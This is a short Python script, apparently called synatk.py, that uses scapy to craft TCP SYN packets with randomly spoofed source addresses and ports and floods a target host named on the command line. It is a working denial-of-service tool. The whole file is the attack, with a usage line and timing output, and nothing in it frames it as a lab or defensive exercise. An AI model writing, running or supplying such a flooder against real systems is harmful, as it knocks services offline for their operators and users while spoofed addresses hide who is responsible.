from scapy.all import *
import sys
import time
from faker import Faker

fake = Faker()

def atk(target, size):

    ip = IP()
    tcp = TCP()
    
    spoof = fake.ipv4()
    spoofport = RandShort()

    payload = raw(b'X'*size)

    ip.dst = target
    ip.src = spoof
    tcp.sport = spoofport
    tcp.flags = 'S'
    packet = ip / tcp / payload
    return packet

def flood(dest, size, num_packets):
    pkts = []

    proctime = time.process_time()

    print(f'making {num_packets} packets...')
    for i in range(0, num_packets+1):
        pkt = atk(dest, size)
        pkts.append(pkt)

        print(str(round((i/num_packets)*100,2))+" %" +" done...", end='\r')

    proctime = time.process_time()-proctime
    print(f'Done in {proctime} sec')

    print(f'flooding {dest}...')
    j = 0
    for pkt in pkts:
        j+=1
        thread = threading.Thread(target=send(pkt, verbose = 0))
        thread.start()
        print(str(round((j/num_packets)*100,2))+" %" +" done...", end='\r')

    proctime = time.process_time()-proctime
    print(f'Done in {proctime} sec')
    print(f'Sent {num_packets} packets at a rate of {round(num_packets/proctime,2)} packets/sec')       
    

if len(sys.argv) != 4:
    print('USAGE: synatk.py <FQDN or ip> <size of packets in bytes> <number of packets>')
    sys.exit(1)
dest = sys.argv[1]
size = sys.argv[2]
num_packets = sys.argv[3]
try:
        size = int(size)
except:
        sys.exit('Invalid size of packets')
try:
        num_packets = int(num_packets)
except:
        sys.exit('Invalid number of packets')


flood(dest=dest, size=size, num_packets=num_packets)